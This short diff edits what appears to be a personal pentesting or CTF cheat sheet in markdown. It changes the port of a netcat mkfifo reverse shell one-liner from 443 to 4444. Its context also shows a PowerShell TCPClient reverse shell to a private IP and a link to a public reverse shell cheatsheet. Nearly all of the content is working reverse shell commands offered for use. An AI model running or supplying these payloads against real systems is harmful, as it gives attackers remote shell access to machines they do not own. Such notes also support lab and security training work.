@@ -61,4 +61,4 @@ powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('10.11.45.
 
 **For other common reverse shell payloads visit this repo** --> [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md)
 
-mkfifo /tmp/f; nc 10.17.47.177 443 < /tmp/f | /bin/sh >/tmp/f 2>&1; rm /tmp/f
+mkfifo /tmp/f; nc 10.17.47.177 4444 < /tmp/f | /bin/sh >/tmp/f 2>&1; rm /tmp/f
